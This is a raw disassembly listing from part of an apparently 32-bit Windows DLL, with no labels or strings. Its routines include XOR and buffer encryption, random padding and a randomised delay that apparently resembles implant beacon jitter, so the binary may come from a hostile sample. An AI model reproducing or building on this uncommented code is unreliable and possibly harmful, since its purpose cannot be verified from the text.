1000584c:	74 03                	je     0x10005851
1000584e:	83 c6 04             	add    $0x4,%esi
10005851:	57                   	push   %edi
10005852:	ff 75 08             	pushl  0x8(%ebp)
10005855:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005858:	50                   	push   %eax
10005859:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000585c:	ff 15 d8 e1 00 10    	call   *0x1000e1d8
10005862:	85 c0                	test   %eax,%eax
10005864:	74 57                	je     0x100058bd
10005866:	8d 45 e8             	lea    -0x18(%ebp),%eax
10005869:	50                   	push   %eax
1000586a:	8d 45 a4             	lea    -0x5c(%ebp),%eax
1000586d:	50                   	push   %eax
1000586e:	57                   	push   %edi
1000586f:	ff 75 fc             	pushl  -0x4(%ebp)
10005872:	56                   	push   %esi
10005873:	57                   	push   %edi
10005874:	57                   	push   %edi
10005875:	57                   	push   %edi
10005876:	57                   	push   %edi
10005877:	53                   	push   %ebx
10005878:	ff 75 08             	pushl  0x8(%ebp)
1000587b:	ff 15 44 e0 00 10    	call   *0x1000e044
10005881:	85 c0                	test   %eax,%eax
10005883:	74 2f                	je     0x100058b4
10005885:	39 7d 10             	cmp    %edi,0x10(%ebp)
10005888:	74 13                	je     0x1000589d
1000588a:	6a 10                	push   $0x10
1000588c:	8d 45 e8             	lea    -0x18(%ebp),%eax
1000588f:	50                   	push   %eax
10005890:	ff 75 10             	pushl  0x10(%ebp)
10005893:	e8 78 84 00 00       	call   0x1000dd10
10005898:	83 c4 0c             	add    $0xc,%esp
1000589b:	eb 10                	jmp    0x100058ad
1000589d:	ff 75 e8             	pushl  -0x18(%ebp)
100058a0:	8b 35 50 e1 00 10    	mov    0x1000e150,%esi
100058a6:	ff d6                	call   *%esi
100058a8:	ff 75 ec             	pushl  -0x14(%ebp)
100058ab:	ff d6                	call   *%esi
100058ad:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
100058b4:	ff 75 fc             	pushl  -0x4(%ebp)
100058b7:	ff 15 dc e1 00 10    	call   *0x1000e1dc
100058bd:	53                   	push   %ebx
100058be:	e8 50 11 00 00       	call   0x10006a13
100058c3:	8b 45 f8             	mov    -0x8(%ebp),%eax
100058c6:	59                   	pop    %ecx
100058c7:	5f                   	pop    %edi
100058c8:	5e                   	pop    %esi
100058c9:	5b                   	pop    %ebx
100058ca:	c9                   	leave  
100058cb:	c3                   	ret    
100058cc:	55                   	push   %ebp
100058cd:	8b ec                	mov    %esp,%ebp
100058cf:	56                   	push   %esi
100058d0:	33 f6                	xor    %esi,%esi
100058d2:	e8 cd fe ff ff       	call   0x100057a4
100058d7:	85 c0                	test   %eax,%eax
100058d9:	74 14                	je     0x100058ef
100058db:	ff 75 10             	pushl  0x10(%ebp)
100058de:	ff 75 0c             	pushl  0xc(%ebp)
100058e1:	ff 75 08             	pushl  0x8(%ebp)
100058e4:	50                   	push   %eax
100058e5:	e8 d5 fe ff ff       	call   0x100057bf
100058ea:	83 c4 10             	add    $0x10,%esp
100058ed:	8b f0                	mov    %eax,%esi
100058ef:	8b c6                	mov    %esi,%eax
100058f1:	5e                   	pop    %esi
100058f2:	5d                   	pop    %ebp
100058f3:	c3                   	ret    
100058f4:	55                   	push   %ebp
100058f5:	8b ec                	mov    %esp,%ebp
100058f7:	56                   	push   %esi
100058f8:	33 f6                	xor    %esi,%esi
100058fa:	e8 b2 fe ff ff       	call   0x100057b1
100058ff:	85 c0                	test   %eax,%eax
10005901:	74 14                	je     0x10005917
10005903:	ff 75 10             	pushl  0x10(%ebp)
10005906:	ff 75 0c             	pushl  0xc(%ebp)
10005909:	ff 75 08             	pushl  0x8(%ebp)
1000590c:	50                   	push   %eax
1000590d:	e8 ad fe ff ff       	call   0x100057bf
10005912:	83 c4 10             	add    $0x10,%esp
10005915:	8b f0                	mov    %eax,%esi
10005917:	8b c6                	mov    %esi,%eax
10005919:	5e                   	pop    %esi
1000591a:	5d                   	pop    %ebp
1000591b:	c3                   	ret    
1000591c:	55                   	push   %ebp
1000591d:	8b ec                	mov    %esp,%ebp
1000591f:	51                   	push   %ecx
10005920:	51                   	push   %ecx
10005921:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
10005925:	53                   	push   %ebx
10005926:	57                   	push   %edi
10005927:	ff 75 08             	pushl  0x8(%ebp)
1000592a:	ff 15 6c e0 00 10    	call   *0x1000e06c
10005930:	8b f8                	mov    %eax,%edi
10005932:	33 db                	xor    %ebx,%ebx
10005934:	3b fb                	cmp    %ebx,%edi
10005936:	74 49                	je     0x10005981
10005938:	56                   	push   %esi
10005939:	8d 77 01             	lea    0x1(%edi),%esi
1000593c:	56                   	push   %esi
1000593d:	e8 a2 10 00 00       	call   0x100069e4
10005942:	59                   	pop    %ecx
10005943:	89 45 fc             	mov    %eax,-0x4(%ebp)
10005946:	3b c3                	cmp    %ebx,%eax
10005948:	74 36                	je     0x10005980
1000594a:	56                   	push   %esi
1000594b:	53                   	push   %ebx
1000594c:	50                   	push   %eax
1000594d:	e8 d8 83 00 00       	call   0x1000dd2a
10005952:	83 c4 0c             	add    $0xc,%esp
10005955:	53                   	push   %ebx
10005956:	53                   	push   %ebx
10005957:	56                   	push   %esi
10005958:	ff 75 fc             	pushl  -0x4(%ebp)
1000595b:	57                   	push   %edi
1000595c:	ff 75 08             	pushl  0x8(%ebp)
1000595f:	53                   	push   %ebx
10005960:	53                   	push   %ebx
10005961:	ff 15 7c e0 00 10    	call   *0x1000e07c
10005967:	85 c0                	test   %eax,%eax
10005969:	74 0c                	je     0x10005977
1000596b:	ff 75 fc             	pushl  -0x4(%ebp)
1000596e:	ff 15 54 e2 00 10    	call   *0x1000e254
10005974:	89 45 f8             	mov    %eax,-0x8(%ebp)
10005977:	ff 75 fc             	pushl  -0x4(%ebp)
1000597a:	e8 94 10 00 00       	call   0x10006a13
1000597f:	59                   	pop    %ecx
10005980:	5e                   	pop    %esi
10005981:	8b 45 f8             	mov    -0x8(%ebp),%eax
10005984:	5f                   	pop    %edi
10005985:	5b                   	pop    %ebx
10005986:	c9                   	leave  
10005987:	c3                   	ret    
10005988:	55                   	push   %ebp
10005989:	8b ec                	mov    %esp,%ebp
1000598b:	83 ec 28             	sub    $0x28,%esp
1000598e:	56                   	push   %esi
1000598f:	33 f6                	xor    %esi,%esi
10005991:	6a 20                	push   $0x20
10005993:	8d 45 d8             	lea    -0x28(%ebp),%eax
10005996:	56                   	push   %esi
10005997:	50                   	push   %eax
10005998:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000599b:	e8 8a 83 00 00       	call   0x1000dd2a
100059a0:	83 c4 0c             	add    $0xc,%esp
100059a3:	8d 45 f8             	lea    -0x8(%ebp),%eax
100059a6:	50                   	push   %eax
100059a7:	8d 45 d8             	lea    -0x28(%ebp),%eax
100059aa:	50                   	push   %eax
100059ab:	56                   	push   %esi
100059ac:	ff 75 08             	pushl  0x8(%ebp)
100059af:	c7 45 dc 02 00 00 00 	movl   $0x2,-0x24(%ebp)
100059b6:	ff 15 40 e2 00 10    	call   *0x1000e240
100059bc:	85 c0                	test   %eax,%eax
100059be:	74 05                	je     0x100059c5
100059c0:	83 c8 ff             	or     $0xffffffff,%eax
100059c3:	eb 12                	jmp    0x100059d7
100059c5:	8b 45 f8             	mov    -0x8(%ebp),%eax
100059c8:	8b 48 18             	mov    0x18(%eax),%ecx
100059cb:	8b 71 04             	mov    0x4(%ecx),%esi
100059ce:	50                   	push   %eax
100059cf:	ff 15 3c e2 00 10    	call   *0x1000e23c
100059d5:	8b c6                	mov    %esi,%eax
100059d7:	5e                   	pop    %esi
100059d8:	c9                   	leave  
100059d9:	c3                   	ret    
100059da:	55                   	push   %ebp
100059db:	8b ec                	mov    %esp,%ebp
100059dd:	81 ec 08 02 00 00    	sub    $0x208,%esp
100059e3:	56                   	push   %esi
100059e4:	68 00 01 00 00       	push   $0x100
100059e9:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
100059ef:	50                   	push   %eax
100059f0:	6a ff                	push   $0xffffffff
100059f2:	ff 75 08             	pushl  0x8(%ebp)
100059f5:	33 f6                	xor    %esi,%esi
100059f7:	56                   	push   %esi
100059f8:	56                   	push   %esi
100059f9:	ff 15 fc e0 00 10    	call   *0x1000e0fc
100059ff:	83 f8 01             	cmp    $0x1,%eax
10005a02:	7e 0f                	jle    0x10005a13
10005a04:	8d 85 fc fd ff ff    	lea    -0x204(%ebp),%eax
10005a0a:	50                   	push   %eax
10005a0b:	e8 78 ff ff ff       	call   0x10005988
10005a10:	59                   	pop    %ecx
10005a11:	8b f0                	mov    %eax,%esi
10005a13:	8b c6                	mov    %esi,%eax
10005a15:	5e                   	pop    %esi
10005a16:	c9                   	leave  
10005a17:	c3                   	ret    
10005a18:	e8 c9 f7 ff ff       	call   0x100051e6
10005a1d:	33 d2                	xor    %edx,%edx
10005a1f:	b9 60 ea 00 00       	mov    $0xea60,%ecx
10005a24:	f7 f1                	div    %ecx
10005a26:	8d 82 88 13 00 00    	lea    0x1388(%edx),%eax
10005a2c:	c3                   	ret    
10005a2d:	56                   	push   %esi
10005a2e:	57                   	push   %edi
10005a2f:	33 ff                	xor    %edi,%edi
10005a31:	33 f6                	xor    %esi,%esi
10005a33:	b8 10 ed 00 10       	mov    $0x1000ed10,%eax
10005a38:	50                   	push   %eax
10005a39:	ff 15 6c e0 00 10    	call   *0x1000e06c
10005a3f:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
10005a43:	8d 04 75 10 ed 00 10 	lea    0x1000ed10(,%esi,2),%eax
10005a4a:	47                   	inc    %edi
10005a4b:	66 83 38 00          	cmpw   $0x0,(%eax)
10005a4f:	75 e7                	jne    0x10005a38
10005a51:	8b c7                	mov    %edi,%eax
10005a53:	5f                   	pop    %edi
10005a54:	5e                   	pop    %esi
10005a55:	c3                   	ret    
10005a56:	55                   	push   %ebp
10005a57:	8b ec                	mov    %esp,%ebp
10005a59:	56                   	push   %esi
10005a5a:	33 f6                	xor    %esi,%esi
10005a5c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
10005a60:	8d 04 75 10 ed 00 10 	lea    0x1000ed10(,%esi,2),%eax
10005a67:	74 1b                	je     0x10005a84
10005a69:	50                   	push   %eax
10005a6a:	ff 15 6c e0 00 10    	call   *0x1000e06c
10005a70:	ff 4d 08             	decl   0x8(%ebp)
10005a73:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
10005a77:	66 83 3c 75 10 ed 00 	cmpw   $0x0,0x1000ed10(,%esi,2)
10005a7e:	10 00 
10005a80:	75 da                	jne    0x10005a5c
10005a82:	33 c0                	xor    %eax,%eax
10005a84:	5e                   	pop    %esi
10005a85:	5d                   	pop    %ebp
10005a86:	c3                   	ret    
10005a87:	55                   	push   %ebp
10005a88:	8b ec                	mov    %esp,%ebp
10005a8a:	56                   	push   %esi
10005a8b:	33 f6                	xor    %esi,%esi
10005a8d:	39 75 0c             	cmp    %esi,0xc(%ebp)
10005a90:	76 11                	jbe    0x10005aa3
10005a92:	e8 4f f7 ff ff       	call   0x100051e6
10005a97:	8b 4d 08             	mov    0x8(%ebp),%ecx
10005a9a:	88 04 0e             	mov    %al,(%esi,%ecx,1)
10005a9d:	46                   	inc    %esi
10005a9e:	3b 75 0c             	cmp    0xc(%ebp),%esi
10005aa1:	72 ef                	jb     0x10005a92
10005aa3:	5e                   	pop    %esi
10005aa4:	5d                   	pop    %ebp
10005aa5:	c3                   	ret    
10005aa6:	e8 de f8 ff ff       	call   0x10005389
10005aab:	33 c0                	xor    %eax,%eax
10005aad:	50                   	push   %eax
10005aae:	50                   	push   %eax
10005aaf:	68 70 e7 00 10       	push   $0x1000e770
10005ab4:	68 88 e7 00 10       	push   $0x1000e788
10005ab9:	68 cc e7 00 10       	push   $0x1000e7cc
10005abe:	50                   	push   %eax
10005abf:	ff 15 80 e1 00 10    	call   *0x1000e180
10005ac5:	33 c0                	xor    %eax,%eax
10005ac7:	c3                   	ret    
10005ac8:	55                   	push   %ebp
10005ac9:	8b ec                	mov    %esp,%ebp
10005acb:	68 d8 e7 00 10       	push   $0x1000e7d8
10005ad0:	ff 75 08             	pushl  0x8(%ebp)
10005ad3:	ff 15 98 e1 00 10    	call   *0x1000e198
10005ad9:	8b 45 08             	mov    0x8(%ebp),%eax
10005adc:	5d                   	pop    %ebp
10005add:	c3                   	ret    
10005ade:	55                   	push   %ebp
10005adf:	8b ec                	mov    %esp,%ebp
10005ae1:	51                   	push   %ecx
10005ae2:	57                   	push   %edi
10005ae3:	8d 45 fc             	lea    -0x4(%ebp),%eax
10005ae6:	50                   	push   %eax
10005ae7:	6a 01                	push   $0x1
10005ae9:	6a 00                	push   $0x0
10005aeb:	ff 75 0c             	pushl  0xc(%ebp)
10005aee:	ff 75 08             	pushl  0x8(%ebp)
10005af1:	ff 15 30 e0 00 10    	call   *0x1000e030
10005af7:	8b f8                	mov    %eax,%edi
10005af9:	85 ff                	test   %edi,%edi
10005afb:	75 2b                	jne    0x10005b28
10005afd:	ff 33                	pushl  (%ebx)
10005aff:	50                   	push   %eax
10005b00:	ff 75 14             	pushl  0x14(%ebp)
10005b03:	e8 22 82 00 00       	call   0x1000dd2a
10005b08:	83 c4 0c             	add    $0xc,%esp
10005b0b:	53                   	push   %ebx
10005b0c:	ff 75 14             	pushl  0x14(%ebp)
10005b0f:	57                   	push   %edi
10005b10:	57                   	push   %edi
10005b11:	ff 75 10             	pushl  0x10(%ebp)
10005b14:	ff 75 fc             	pushl  -0x4(%ebp)
10005b17:	ff 15 48 e0 00 10    	call   *0x1000e048
10005b1d:	ff 75 fc             	pushl  -0x4(%ebp)
10005b20:	8b f8                	mov    %eax,%edi
10005b22:	ff 15 24 e0 00 10    	call   *0x1000e024
10005b28:	8b c7                	mov    %edi,%eax
10005b2a:	5f                   	pop    %edi
10005b2b:	c9                   	leave  
10005b2c:	c3                   	ret    
10005b2d:	55                   	push   %ebp
10005b2e:	8b ec                	mov    %esp,%ebp
10005b30:	81 ec 14 01 00 00    	sub    $0x114,%esp
10005b36:	68 14 01 00 00       	push   $0x114
10005b3b:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
10005b41:	6a 00                	push   $0x0
10005b43:	50                   	push   %eax
10005b44:	e8 e1 81 00 00       	call   0x1000dd2a
10005b49:	83 c4 0c             	add    $0xc,%esp
10005b4c:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
10005b52:	50                   	push   %eax
10005b53:	c7 85 ec fe ff ff 14 	movl   $0x114,-0x114(%ebp)
10005b5a:	01 00 00 
10005b5d:	ff 15 20 e1 00 10    	call   *0x1000e120
10005b63:	8b 85 f8 fe ff ff    	mov    -0x108(%ebp),%eax
10005b69:	c9                   	leave  
10005b6a:	c3                   	ret    
10005b6b:	33 c9                	xor    %ecx,%ecx
10005b6d:	89 08                	mov    %ecx,(%eax)
10005b6f:	89 48 04             	mov    %ecx,0x4(%eax)
10005b72:	89 48 08             	mov    %ecx,0x8(%eax)
10005b75:	89 48 0c             	mov    %ecx,0xc(%eax)
10005b78:	c3                   	ret    
10005b79:	8b 00                	mov    (%eax),%eax
10005b7b:	85 c0                	test   %eax,%eax
10005b7d:	74 07                	je     0x10005b86
10005b7f:	50                   	push   %eax
10005b80:	e8 8e 0e 00 00       	call   0x10006a13
10005b85:	59                   	pop    %ecx
10005b86:	c3                   	ret    
10005b87:	57                   	push   %edi
10005b88:	53                   	push   %ebx
10005b89:	e8 56 0e 00 00       	call   0x100069e4
10005b8e:	8b f8                	mov    %eax,%edi
10005b90:	59                   	pop    %ecx
10005b91:	85 ff                	test   %edi,%edi
10005b93:	75 02                	jne    0x10005b97
10005b95:	5f                   	pop    %edi
10005b96:	c3                   	ret    
10005b97:	8b 06                	mov    (%esi),%eax
10005b99:	85 c0                	test   %eax,%eax
10005b9b:	74 14                	je     0x10005bb1
10005b9d:	ff 76 08             	pushl  0x8(%esi)
10005ba0:	50                   	push   %eax
10005ba1:	57                   	push   %edi
10005ba2:	e8 69 81 00 00       	call   0x1000dd10
10005ba7:	ff 36                	pushl  (%esi)
10005ba9:	e8 65 0e 00 00       	call   0x10006a13
10005bae:	83 c4 10             	add    $0x10,%esp
10005bb1:	33 c0                	xor    %eax,%eax
10005bb3:	89 3e                	mov    %edi,(%esi)
10005bb5:	89 5e 04             	mov    %ebx,0x4(%esi)
10005bb8:	40                   	inc    %eax
10005bb9:	5f                   	pop    %edi
10005bba:	c3                   	ret    
10005bbb:	53                   	push   %ebx
10005bbc:	56                   	push   %esi
10005bbd:	8b f0                	mov    %eax,%esi
10005bbf:	8b 46 04             	mov    0x4(%esi),%eax
10005bc2:	bb 00 10 00 00       	mov    $0x1000,%ebx
10005bc7:	85 c0                	test   %eax,%eax
10005bc9:	74 03                	je     0x10005bce
10005bcb:	8d 1c 00             	lea    (%eax,%eax,1),%ebx
10005bce:	e8 b4 ff ff ff       	call   0x10005b87
10005bd3:	5e                   	pop    %esi
10005bd4:	5b                   	pop    %ebx
10005bd5:	c3                   	ret    
10005bd6:	55                   	push   %ebp
10005bd7:	8b ec                	mov    %esp,%ebp
10005bd9:	eb 0b                	jmp    0x10005be6
10005bdb:	8b c6                	mov    %esi,%eax
10005bdd:	e8 d9 ff ff ff       	call   0x10005bbb
10005be2:	85 c0                	test   %eax,%eax
10005be4:	74 31                	je     0x10005c17
10005be6:	8b 46 0c             	mov    0xc(%esi),%eax
10005be9:	03 c7                	add    %edi,%eax
10005beb:	3b 46 04             	cmp    0x4(%esi),%eax
10005bee:	77 eb                	ja     0x10005bdb
10005bf0:	8b 06                	mov    (%esi),%eax
10005bf2:	03 46 0c             	add    0xc(%esi),%eax
10005bf5:	57                   	push   %edi
10005bf6:	ff 75 08             	pushl  0x8(%ebp)
10005bf9:	50                   	push   %eax
10005bfa:	e8 11 81 00 00       	call   0x1000dd10
10005bff:	01 7e 0c             	add    %edi,0xc(%esi)
10005c02:	8b 46 0c             	mov    0xc(%esi),%eax
10005c05:	83 c4 0c             	add    $0xc,%esp
10005c08:	3b 46 08             	cmp    0x8(%esi),%eax
10005c0b:	76 03                	jbe    0x10005c10
10005c0d:	89 46 08             	mov    %eax,0x8(%esi)
10005c10:	8b 46 08             	mov    0x8(%esi),%eax
10005c13:	5d                   	pop    %ebp
10005c14:	c2 04 00             	ret    $0x4
10005c17:	33 c0                	xor    %eax,%eax
10005c19:	eb f8                	jmp    0x10005c13
10005c1b:	55                   	push   %ebp
10005c1c:	8b ec                	mov    %esp,%ebp
10005c1e:	56                   	push   %esi
10005c1f:	33 c9                	xor    %ecx,%ecx
10005c21:	33 f6                	xor    %esi,%esi
10005c23:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
10005c26:	76 1a                	jbe    0x10005c42
10005c28:	8b 55 10             	mov    0x10(%ebp),%edx
10005c2b:	8a 14 11             	mov    (%ecx,%edx,1),%dl
10005c2e:	8b 45 08             	mov    0x8(%ebp),%eax
10005c31:	30 14 30             	xor    %dl,(%eax,%esi,1)
10005c34:	41                   	inc    %ecx
10005c35:	83 f9 20             	cmp    $0x20,%ecx
10005c38:	75 02                	jne    0x10005c3c
10005c3a:	33 c9                	xor    %ecx,%ecx
10005c3c:	46                   	inc    %esi
10005c3d:	3b 75 0c             	cmp    0xc(%ebp),%esi
10005c40:	72 e6                	jb     0x10005c28
10005c42:	5e                   	pop    %esi
10005c43:	5d                   	pop    %ebp
10005c44:	c3                   	ret    
10005c45:	55                   	push   %ebp
10005c46:	8b ec                	mov    %esp,%ebp
10005c48:	5d                   	pop    %ebp
10005c49:	e9 a8 13 00 00       	jmp    0x10006ff6
10005c4e:	55                   	push   %ebp
10005c4f:	8b ec                	mov    %esp,%ebp
10005c51:	83 ec 54             	sub    $0x54,%esp
10005c54:	56                   	push   %esi
10005c55:	8b f0                	mov    %eax,%esi
10005c57:	8d 45 e0             	lea    -0x20(%ebp),%eax
10005c5a:	50                   	push   %eax
10005c5b:	ff 75 0c             	pushl  0xc(%ebp)
10005c5e:	ff 75 08             	pushl  0x8(%ebp)
10005c61:	e8 df ff ff ff       	call   0x10005c45
10005c66:	83 c4 0c             	add    $0xc,%esp
10005c69:	85 f6                	test   %esi,%esi
10005c6b:	7e 39                	jle    0x10005ca6
10005c6d:	6a 20                	push   $0x20
10005c6f:	8d 45 e0             	lea    -0x20(%ebp),%eax
10005c72:	50                   	push   %eax
10005c73:	8d 45 b0             	lea    -0x50(%ebp),%eax
10005c76:	50                   	push   %eax
10005c77:	e8 94 80 00 00       	call   0x1000dd10
10005c7c:	83 c4 0c             	add    $0xc,%esp
10005c7f:	33 c0                	xor    %eax,%eax
10005c81:	8a 4c 05 e0          	mov    -0x20(%ebp,%eax,1),%cl
10005c85:	fe c1                	inc    %cl
10005c87:	88 4c 05 d0          	mov    %cl,-0x30(%ebp,%eax,1)
10005c8b:	40                   	inc    %eax
10005c8c:	83 f8 10             	cmp    $0x10,%eax
10005c8f:	7c f0                	jl     0x10005c81
10005c91:	8d 45 e0             	lea    -0x20(%ebp),%eax
10005c94:	50                   	push   %eax
10005c95:	8d 45 b0             	lea    -0x50(%ebp),%eax
10005c98:	6a 30                	push   $0x30
10005c9a:	50                   	push   %eax
10005c9b:	e8 a5 ff ff ff       	call   0x10005c45
10005ca0:	83 c4 0c             	add    $0xc,%esp
10005ca3:	4e                   	dec    %esi
10005ca4:	75 c7                	jne    0x10005c6d
10005ca6:	ff 75 14             	pushl  0x14(%ebp)
10005ca9:	8d 45 e0             	lea    -0x20(%ebp),%eax
10005cac:	50                   	push   %eax
10005cad:	ff 75 10             	pushl  0x10(%ebp)
10005cb0:	e8 5b 80 00 00       	call   0x1000dd10
10005cb5:	83 c4 0c             	add    $0xc,%esp
10005cb8:	5e                   	pop    %esi
10005cb9:	c9                   	leave  
10005cba:	c3                   	ret    
10005cbb:	55                   	push   %ebp
10005cbc:	8b ec                	mov    %esp,%ebp
10005cbe:	51                   	push   %ecx
10005cbf:	57                   	push   %edi
10005cc0:	6a 20                	push   $0x20
10005cc2:	ff 75 08             	pushl  0x8(%ebp)
10005cc5:	8b f8                	mov    %eax,%edi
10005cc7:	6a 20                	push   $0x20
10005cc9:	8d 04 36             	lea    (%esi,%esi,1),%eax
10005ccc:	57                   	push   %edi
10005ccd:	e8 7c ff ff ff       	call   0x10005c4e
10005cd2:	6a 10                	push   $0x10
10005cd4:	ff 75 0c             	pushl  0xc(%ebp)
10005cd7:	83 c7 20             	add    $0x20,%edi
10005cda:	6a 10                	push   $0x10
10005cdc:	57                   	push   %edi
10005cdd:	8b c6                	mov    %esi,%eax
10005cdf:	e8 6a ff ff ff       	call   0x10005c4e
10005ce4:	83 c4 20             	add    $0x20,%esp
10005ce7:	5f                   	pop    %edi
10005ce8:	59                   	pop    %ecx
10005ce9:	5d                   	pop    %ebp
10005cea:	c3                   	ret    
10005ceb:	55                   	push   %ebp
10005cec:	8b ec                	mov    %esp,%ebp
10005cee:	83 e4 f8             	and    $0xfffffff8,%esp
10005cf1:	81 ec 58 01 00 00    	sub    $0x158,%esp
10005cf7:	53                   	push   %ebx
10005cf8:	8b 5d 0c             	mov    0xc(%ebp),%ebx
10005cfb:	8b c3                	mov    %ebx,%eax
10005cfd:	83 e0 0f             	and    $0xf,%eax
10005d00:	2b d8                	sub    %eax,%ebx
10005d02:	83 c3 10             	add    $0x10,%ebx
10005d05:	8d 43 30             	lea    0x30(%ebx),%eax
10005d08:	56                   	push   %esi
10005d09:	89 44 24 10          	mov    %eax,0x10(%esp)
10005d0d:	3b 45 10             	cmp    0x10(%ebp),%eax
10005d10:	76 07                	jbe    0x10005d19
10005d12:	33 c0                	xor    %eax,%eax
10005d14:	e9 84 00 00 00       	jmp    0x10005d9d
10005d19:	6a 30                	push   $0x30
10005d1b:	57                   	push   %edi
10005d1c:	e8 66 fd ff ff       	call   0x10005a87
10005d21:	ff 75 0c             	pushl  0xc(%ebp)
10005d24:	8d 47 30             	lea    0x30(%edi),%eax
10005d27:	ff 75 08             	pushl  0x8(%ebp)
10005d2a:	89 44 24 1c          	mov    %eax,0x1c(%esp)
10005d2e:	50                   	push   %eax
10005d2f:	e8 dc 7f 00 00       	call   0x1000dd10
10005d34:	8b 4d 0c             	mov    0xc(%ebp),%ecx
10005d37:	8a c3                	mov    %bl,%al
10005d39:	2a c1                	sub    %cl,%al
10005d3b:	88 44 24 28          	mov    %al,0x28(%esp)
10005d3f:	0f b6 c0             	movzbl %al,%eax
10005d42:	83 c4 14             	add    $0x14,%esp
10005d45:	50                   	push   %eax
10005d46:	ff 74 24 18          	pushl  0x18(%esp)
10005d4a:	8d 44 39 30          	lea    0x30(%ecx,%edi,1),%eax
10005d4e:	50                   	push   %eax
10005d4f:	e8 d6 7f 00 00       	call   0x1000dd2a
10005d54:	83 c4 0c             	add    $0xc,%esp
10005d57:	8d 44 24 18          	lea    0x18(%esp),%eax
10005d5b:	50                   	push   %eax
10005d5c:	8d 44 24 2c          	lea    0x2c(%esp),%eax
10005d60:	50                   	push   %eax
10005d61:	33 f6                	xor    %esi,%esi
10005d63:	46                   	inc    %esi
10005d64:	8b c7                	mov    %edi,%eax
10005d66:	e8 50 ff ff ff       	call   0x10005cbb
10005d6b:	8d 44 24 30          	lea    0x30(%esp),%eax
10005d6f:	50                   	push   %eax
10005d70:	8d 44 24 54          	lea    0x54(%esp),%eax
10005d74:	e8 29 31 00 00       	call   0x10008ea2
10005d79:	83 c4 0c             	add    $0xc,%esp
10005d7c:	ff 74 24 0c          	pushl  0xc(%esp)
10005d80:	8d 44 24 1c          	lea    0x1c(%esp),%eax
10005d84:	ff 74 24 10          	pushl  0x10(%esp)
10005d88:	8b cb                	mov    %ebx,%ecx
10005d8a:	50                   	push   %eax
10005d8b:	8d 44 24 54          	lea    0x54(%esp),%eax
10005d8f:	56                   	push   %esi
10005d90:	50                   	push   %eax
10005d91:	e8 70 3d 00 00       	call   0x10009b06
10005d96:	8b 44 24 24          	mov    0x24(%esp),%eax
10005d9a:	83 c4 14             	add    $0x14,%esp
10005d9d:	5e                   	pop    %esi
10005d9e:	5b                   	pop    %ebx
10005d9f:	8b e5                	mov    %ebp,%esp
10005da1:	5d                   	pop    %ebp
10005da2:	c3                   	ret    
10005da3:	55                   	push   %ebp
10005da4:	8b ec                	mov    %esp,%ebp
10005da6:	6a 40                	push   $0x40
10005da8:	59                   	pop    %ecx
10005da9:	5d                   	pop    %ebp
10005daa:	e9 00 00 00 00       	jmp    0x10005daf
10005daf:	55                   	push   %ebp
10005db0:	8b ec                	mov    %esp,%ebp
10005db2:	83 e4 f8             	and    $0xfffffff8,%esp
10005db5:	81 ec 48 01 00 00    	sub    $0x148,%esp
10005dbb:	56                   	push   %esi
10005dbc:	57                   	push   %edi
10005dbd:	83 fb 31             	cmp    $0x31,%ebx
10005dc0:	73 04                	jae    0x10005dc6
10005dc2:	33 c0                	xor    %eax,%eax
10005dc4:	eb 5f                	jmp    0x10005e25
10005dc6:	f6 c3 0f             	test   $0xf,%bl
10005dc9:	75 f7                	jne    0x10005dc2
10005dcb:	8d 7b d0             	lea    -0x30(%ebx),%edi
10005dce:	39 7d 10             	cmp    %edi,0x10(%ebp)
10005dd1:	72 ef                	jb     0x10005dc2
10005dd3:	8d 44 24 08          	lea    0x8(%esp),%eax
10005dd7:	50                   	push   %eax
10005dd8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
10005ddc:	50                   	push   %eax
10005ddd:	8b 45 08             	mov    0x8(%ebp),%eax
10005de0:	8b f1                	mov    %ecx,%esi
10005de2:	e8 d4 fe ff ff       	call   0x10005cbb
10005de7:	8d 44 24 20          	lea    0x20(%esp),%eax
10005deb:	50                   	push   %eax
10005dec:	8d 44 24 44          	lea    0x44(%esp),%eax
10005df0:	e8 f3 32 00 00       	call   0x100090e8
10005df5:	8b 75 0c             	mov    0xc(%ebp),%esi
10005df8:	8b 45 08             	mov    0x8(%ebp),%eax
10005dfb:	83 c4 0c             	add    $0xc,%esp
10005dfe:	56                   	push   %esi
10005dff:	83 c0 30             	add    $0x30,%eax
10005e02:	50                   	push   %eax
10005e03:	8d 44 24 10          	lea    0x10(%esp),%eax
10005e07:	50                   	push   %eax
10005e08:	8d 44 24 44          	lea    0x44(%esp),%eax
10005e0c:	6a 00                	push   $0x0
10005e0e:	50                   	push   %eax
10005e0f:	8b cf                	mov    %edi,%ecx
10005e11:	e8 f0 3c 00 00       	call   0x10009b06
10005e16:	0f b6 4c 33 cf       	movzbl -0x31(%ebx,%esi,1),%ecx
10005e1b:	8b c3                	mov    %ebx,%eax
10005e1d:	2b c1                	sub    %ecx,%eax
10005e1f:	83 c4 14             	add    $0x14,%esp
10005e22:	83 e8 30             	sub    $0x30,%eax
10005e25:	5f                   	pop    %edi
10005e26:	5e                   	pop    %esi
10005e27:	8b e5                	mov    %ebp,%esp
10005e29:	5d                   	pop    %ebp
10005e2a:	c3                   	ret    
10005e2b:	55                   	push   %ebp
10005e2c:	8b ec                	mov    %esp,%ebp
10005e2e:	56                   	push   %esi
10005e2f:	8b f0                	mov    %eax,%esi
10005e31:	8d 86 44 01 00 00    	lea    0x144(%esi),%eax
10005e37:	e8 2f fd ff ff       	call   0x10005b6b
10005e3c:	ff 75 10             	pushl  0x10(%ebp)
10005e3f:	8b 45 14             	mov    0x14(%ebp),%eax
10005e42:	ff 75 0c             	pushl  0xc(%ebp)
10005e45:	89 86 24 01 00 00    	mov    %eax,0x124(%esi)
10005e4b:	ff 75 08             	pushl  0x8(%ebp)
10005e4e:	33 c0                	xor    %eax,%eax
10005e50:	89 86 38 01 00 00    	mov    %eax,0x138(%esi)
10005e56:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
